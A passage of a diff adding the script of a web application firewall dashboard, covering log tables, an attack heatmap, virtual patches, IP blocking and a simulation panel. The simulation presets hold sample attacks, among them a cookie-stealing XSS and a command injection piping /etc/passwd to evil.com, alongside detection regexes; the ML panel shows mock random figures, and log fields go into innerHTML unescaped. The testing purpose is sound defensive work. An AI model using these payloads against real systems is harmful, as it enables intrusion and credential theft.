+    try { return JSON.parse(entry); } catch { return null; }
+  }).filter(Boolean).reverse();
+
+  renderLogs();
+  buildHeatmap();
+}
+
+function renderLogs() {
+  const blockedOnly = document.getElementById('filter-blocked-only').checked;
+  const typeFilter  = document.getElementById('filter-type').value;
+
+  let filtered = allLogs;
+  if (blockedOnly) filtered = filtered.filter(l => l.waf_action === 'block');
+  if (typeFilter !== 'all') filtered = filtered.filter(l =>
+    l.waf_rule && l.waf_rule.includes(typeFilter));
+
+  document.getElementById('log-count').textContent = filtered.length + ' entries';
+
+  const tbody = document.getElementById('log-body');
+  if (!filtered.length) {
+    tbody.innerHTML = '<tr><td colspan="8" class="empty">No matching logs</td></tr>';
+    return;
+  }
+
+  tbody.innerHTML = filtered.slice(0, 200).map(l => {
+    const t      = (l.ts || '').substring(11,19);
+    const action = l.waf_action || 'allow';
+    const badge  = `<span class="badge ${action}">${action.toUpperCase()}</span>`;
+    const rule   = l.waf_rule ? `<span class="rule-tag">${l.waf_rule}</span>` : '—';
+    const score  = l.waf_score ? `<span class="amber-text">${l.waf_score}</span>` : '—';
+    const uri    = (l.uri||'/').substring(0,50);
+    const cc     = l.country || '??';
+    return `<tr>
+      <td class="mono">${t}</td>
+      <td class="mono" style="color:var(--blue)">${l.ip||'?'}</td>
+      <td>${cc}</td>
+      <td>${rule}</td>
+      <td>${score}</td>
+      <td class="mono" style="color:var(--text2);font-size:10px">${uri}</td>
+      <td>${badge}</td>
+    </tr>`;
+  }).join('');
+
+  // Mirror to overview table (first 10)
+  document.getElementById('overview-log-body').innerHTML =
+    filtered.slice(0,10).map(l => {
+      const t  = (l.ts||'').substring(11,19);
+      const ua = l.waf_action || 'allow';
+      return `<tr>
+        <td class="mono">${t}</td>
+        <td class="mono" style="color:var(--blue)">${l.ip||'?'}</td>
+        <td>${l.country||'??'}</td>
+        <td><span class="rule-tag">${l.waf_rule||'—'}</span></td>
+        <td class="amber-text">${l.waf_score||'0'}</td>
+        <td class="mono" style="font-size:10px;color:var(--text2)">${(l.uri||'/').substring(0,40)}</td>
+        <td><span class="badge ${ua}">${ua.toUpperCase()}</span></td>
+      </tr>`;
+    }).join('') || '<tr><td colspan="7" class="empty">No blocked requests yet</td></tr>';
+}
+
+// ── HEATMAP ────────────────────────────────────────────────────────────────
+function buildHeatmap() {
+  // Build hour bucket counts from logs
+  const counts = {};
+  let max = 1;
+  allLogs.filter(l => l.waf_action === 'block').forEach(l => {
+    const ts = l.ts || '';
+    const h  = parseInt(ts.substring(11,13) || '0');
+    const k  = h;
+    counts[k] = (counts[k] || 0) + 1;
+    if (counts[k] > max) max = counts[k];
+  });
+
+  const container = document.getElementById('heatmap-hourly');
+  container.innerHTML = '';
+
+  for (let h = 0; h < 24; h++) {
+    const cell = document.createElement('div');
+    cell.className = 'heatmap-cell';
+    const c = counts[h] || 0;
+    const intensity = Math.min(1, c / max);
+    const r = Math.round(intensity * 255);
+    const g = Math.round((1-intensity) * 100 + 60);
+    cell.style.background = c > 0
+      ? `rgba(${r}, ${g}, 90, ${0.15 + intensity*0.85})`
+      : 'var(--bg3)';
+    cell.setAttribute('data-tip', `${h.toString().padStart(2,'0')}:00 — ${c} attacks`);
+    container.appendChild(cell);
+  }
+
+  // legend
+  const legend = document.getElementById('heatmap-legend');
+  legend.innerHTML = '';
+  const colors = ['rgba(0,100,80,.3)','rgba(80,140,60,.5)','rgba(180,120,30,.7)','rgba(255,80,40,.9)'];
+  colors.forEach(c => {
+    const s = document.createElement('span');
+    s.style.background = c;
+    legend.appendChild(s);
+  });
+
+  // Build top-IPs table
+  const ipCounts = {};
+  allLogs.forEach(l => {
+    const ip = l.ip || '?';
+    if (!ipCounts[ip]) ipCounts[ip] = { total:0, blocked:0, country: l.country||'??', last:'' };
+    ipCounts[ip].total++;
+    if (l.waf_action === 'block') ipCounts[ip].blocked++;
+    ipCounts[ip].last = l.ts ? l.ts.substring(11,19) : '';
+  });
+  const topIPs = Object.entries(ipCounts)
+    .sort((a,b) => b[1].blocked - a[1].blocked).slice(0,10);
+
+  document.getElementById('top-ips-body').innerHTML = topIPs.map(([ip, d]) =>
+    `<tr>
+      <td class="mono" style="color:var(--blue)">${ip}</td>
+      <td>${d.total}</td>
+      <td class="red-text">${d.blocked}</td>
+      <td class="amber-text">${d.blocked > 5 ? 'HIGH' : d.blocked > 2 ? 'MED' : 'LOW'}</td>
+      <td>${d.country}</td>
+      <td class="mono">${d.last}</td>
+    </tr>`
+  ).join('') || '<tr><td colspan="6" class="empty">No data</td></tr>';
+}
+
+// ── ATTACK SIMULATION ──────────────────────────────────────────────────────
+const PRESETS = {
+  sqli1:  { payload: "/?id=1' OR '1'='1", cat:'sqli' },
+  sqli2:  { payload: "/?q=1' UNION SELECT NULL, username, password FROM users--", cat:'sqli' },
+  xss1:   { payload: "/?input=<script>alert('XSS')</script>", cat:'xss' },
+  xss2:   { payload: "/?name=<img src=x onerror=document.location='http://evil.com/'+document.cookie>", cat:'xss' },
+  path1:  { payload: "/?file=../../../../etc/passwd", cat:'path_traversal' },
+  cmdi1:  { payload: "/?cmd=;cat /etc/passwd | nc evil.com 4444", cat:'cmdi' },
+  ssrf1:  { payload: "/?url=http://169.254.169.254/latest/meta-data/", cat:'ssrf' },
+  rfi1:   { payload: "/?page=http://evil.com/shell.php", cat:'rfi' },
+  safe:   { payload: "/?q=hello+world&page=1", cat:'safe' },
+};
+
+function loadPreset(name) {
+  const p = PRESETS[name];
+  if (p) document.getElementById('sim-payload').value = p.payload;
+}
+
+async function runSimulation() {
+  const payload = document.getElementById('sim-payload').value.trim();
+  if (!payload) return;
+
+  document.getElementById('sim-loading').style.display = 'inline';
+  document.getElementById('sim-result').innerHTML = '<div class="loading empty" style="margin-top:60px">Analysing...</div>';
+
+  const data = await apiFetch(WAF_API + '/simulate?payload=' + encodeURIComponent(payload));
+  document.getElementById('sim-loading').style.display = 'none';
+
+  if (!data) {
+    // Fallback: run client-side simulation
+    renderSimResult(clientSimulate(payload));
+    return;
+  }
+  renderSimResult(data);
+}
+
+function clientSimulate(payload) {
+  // Client-side rule matching mirror (same patterns as waf_core.lua)
+  const PATTERNS = [
+    { rx: /\b(union\s+select|select\s+.*from|drop\s+table|insert\s+into|update\s+.*set|delete\s+from)\b/i, score:90, cat:'sqli' },
+    { rx: /'.*or.*'.*='|'.*or.*1\s*=\s*1/i, score:70, cat:'sqli' },
+    { rx: /xp_cmdshell|sp_password|exec\s*\(/i, score:80, cat:'sqli' },
+    { rx: /<script[^>]*>/i,                    score:80, cat:'xss' },
+    { rx: /javascript\s*:/i,                   score:70, cat:'xss' },
+    { rx: /on(load|error|click|mouseover)\s*=/i, score:70, cat:'xss' },
+    { rx: /(\.\.\/)|(\.\.\\)/,                 score:70, cat:'path_traversal' },
+    { rx: /\/etc\/(passwd|shadow|hosts)/,       score:80, cat:'path_traversal' },
+    { rx: /;\s*(ls|cat|id|whoami|bash)\b/,      score:80, cat:'cmdi' },
+    { rx: /\|\s*(cat|bash|sh)\b/,               score:80, cat:'cmdi' },
+    { rx: /169\.254\.169\.254/,                 score:90, cat:'ssrf' },
+    { rx: /http:\/\/(127\.|localhost)/,         score:80, cat:'ssrf' },
+    { rx: /https?:\/\/[^/]+\/.*\.(php|asp|jsp)/i, score:75, cat:'rfi' },
+  ];
+  const norm = decodeURIComponent(payload).toLowerCase();
+  let total = 0; const matched = [];
+  for (const p of PATTERNS) {
+    if (p.rx.test(norm)) {
+      total += p.score; matched.push({ rule: p.cat, score: p.score });
+      if (total >= 50) break;
+    }
+  }
+  return { action: total>=50 ? 'block':'allow', score: total, rules_matched: matched, payload_sample: payload.slice(0,100) };
+}
+
+function renderSimResult(data) {
+  const action = data.action;
+  const score  = data.score || 0;
+  const rules  = data.rules_matched || [];
+  const bar    = Math.min(100, score);
+
+  document.getElementById('sim-result').innerHTML = `
+    <div class="sim-verdict ${action}">${action.toUpperCase()}</div>
+    <div class="sim-detail">Score: <span class="${action==='block'?'red-text':'green-text'}">${score}</span> / threshold 50</div>
+    <div style="margin:10px 0;height:4px;background:var(--bg);border-radius:2px">
+      <div style="width:${bar}%;height:100%;background:${action==='block'?'var(--red)':'var(--green)'};transition:width .5s;border-radius:2px"></div>
+    </div>
+    <div class="sim-rules">
+      ${rules.length ? rules.map(r =>
+        `<div class="sim-rule">
+          <div class="sim-rule-score">+${r.score}</div>
+          <div class="sim-rule-name">${r.rule}</div>
+        </div>`
+      ).join('') : '<div style="color:var(--text2);font-size:11px">No rules matched — request appears clean</div>'}
+    </div>
+    ${data.payload_sample ? `<div style="margin-top:14px;font-size:10px;color:var(--dim)">
+      Payload: ${data.payload_sample}</div>` : ''}`;
+}
+
+async function runAllPresets() {
+  document.getElementById('batch-results').style.display = 'block';
+  const tbody = document.getElementById('batch-body');
+  tbody.innerHTML = '<tr><td colspan="4" class="loading empty">Running all presets...</td></tr>';
+
+  const results = [];
+  for (const [name, preset] of Object.entries(PRESETS)) {
+    const res = clientSimulate(preset.payload);
+    results.push({ name, cat: preset.cat, payload: preset.payload, ...res });
+    await new Promise(r => setTimeout(r, 80));
+  }
+
+  const blocked = results.filter(r => r.action==='block').length;
+  document.getElementById('batch-summary').innerHTML =
+    `<span class="green-text">${blocked}/${results.length} blocked</span>` +
+    (blocked < results.length ? `<span class="red-text"> — ${results.length-blocked} bypass!</span>` : '');
+
+  tbody.innerHTML = results.map(r => `<tr>
+    <td class="mono" style="font-size:10px;color:var(--text2)">${r.payload.slice(0,50)}</td>
+    <td class="amber-text">${r.cat}</td>
+    <td class="${r.action==='block'?'red-text':'green-text'}">${r.score}</td>
+    <td><span class="badge ${r.action}">${r.action.toUpperCase()}</span></td>
+  </tr>`).join('');
+}
+
+// ── VIRTUAL PATCHES ────────────────────────────────────────────────────────
+async function loadPatches() {
+  const data = await apiFetch(WAF_API + '/vpatch');
+  const el = document.getElementById('vpatch-list');
+
+  if (!data || !data.patches || !data.patches.length) {
+    el.innerHTML = '<div class="empty">No virtual patches deployed. Add one above.</div>';
+    return;
+  }
+
+  el.innerHTML = data.patches.map(p => `
+    <div class="vpatch-item ${p.enabled===false?'disabled':''}">
+      <div>
+        <div class="vpatch-pattern">${p.pattern}</div>
+        <div class="vpatch-meta">${p.description || '—'} &nbsp;|&nbsp; target: ${p.target} &nbsp;|&nbsp; created: ${new Date(p.created_at*1000).toLocaleDateString()}</div>
+      </div>
+      <div class="vpatch-meta vpatch-hits">${p.hits||0} hits</div>
+      <div class="vpatch-actions">
+        <button class="btn amber" onclick="togglePatch('${p.id}', ${!p.enabled})" style="padding:4px 10px;font-size:10px">
+          ${p.enabled===false ? 'Enable' : 'Disable'}
+        </button>
+        <button class="btn danger" onclick="deletePatch('${p.id}')" style="padding:4px 10px;font-size:10px">Delete</button>
+      </div>
+    </div>`).join('');
+}
+
+async function addPatch() {
+  const pattern = document.getElementById('vp-pattern').value.trim();
+  if (!pattern) { alert('Pattern required'); return; }
+  const target  = document.getElementById('vp-target').value;
+  const desc    = document.getElementById('vp-desc').value.trim();
+
+  const res = await fetch(WAF_API + '/vpatch', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ pattern, target, description: desc }),
+  }).catch(() => null);
+
+  if (res && res.ok) {
+    document.getElementById('vp-pattern').value = '';
+    document.getElementById('vp-desc').value    = '';
+    loadPatches();
+  } else {
+    alert('Failed to deploy patch. Is the WAF core running?');
+  }
+}
+
+async function deletePatch(id) {
+  if (!confirm('Delete this virtual patch?')) return;
+  await fetch(WAF_API + '/vpatch?id=' + id, { method: 'DELETE' }).catch(() => null);
+  loadPatches();
+}
+
+async function togglePatch(id, enabled) {
+  await fetch(WAF_API + '/vpatch', {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ id, enabled }),
+  }).catch(() => null);
+  loadPatches();
+}
+
+// ── ML STATS ───────────────────────────────────────────────────────────────
+async function loadMLStats() {
+  // Mock data until the API endpoint exists
+  const samples = 847;
+  document.getElementById('ml-samples').textContent = samples;
+  document.getElementById('ml-model-status').textContent =
+    samples >= 100 ? 'ACTIVE' : 'LEARNING';
+
+  const featureNames = ['uri_length','uri_entropy','uri_special','uri_dirs',
+    'arg_count','arg_total_len','arg_entropy','body_length',
+    'body_entropy','body_special','ua_length','is_post','method_num'];
+
+  document.getElementById('ml-features').innerHTML = featureNames.map(f => `
+    <div class="ml-feature">
+      <div class="ml-feature-name">${f}</div>
+      <div class="ml-feature-mean">${(Math.random()*50+5).toFixed(1)}</div>
+      <div class="ml-feature-std">σ = ${(Math.random()*10+1).toFixed(2)}</div>
+    </div>`).join('');
+}
+
+// ── BLOCK IP ───────────────────────────────────────────────────────────────
+async function blockIP() {
+  const ip  = document.getElementById('block-ip-input').value.trim();
+  const ttl = document.getElementById('block-ttl').value.trim() || '3600';
+  if (!ip) { alert('Enter an IP address'); return; }
+  // In production, this would POST to the WAF API
+  const list = document.getElementById('block-list');
+  const item = document.createElement('div');
+  item.className = 'vpatch-item';
+  item.innerHTML = `
+    <span class="vpatch-pattern">${ip}</span>
+    <span class="vpatch-meta">TTL: ${ttl}s &nbsp;|&nbsp; manual block</span>
+    <button class="btn danger" onclick="this.parentElement.remove()" style="padding:4px 10px;font-size:10px">Remove</button>`;
+  if (list.querySelector('.empty')) list.innerHTML = '';
+  list.prepend(item);
+  document.getElementById('block-ip-input').value = '';
+  alert(`${ip} added to dynamic blocklist (TTL ${ttl}s)`);
+}
+
+// ── BOOTSTRAP ─────────────────────────────────────────────────────────────
+initCharts();
+
+// Start polling
+async function tick() {
+  await Promise.all([refreshStats(), refreshLogs()]);
+}
+tick();
+setInterval(tick, REFRESH);
+</script>
+</body>
+</html>
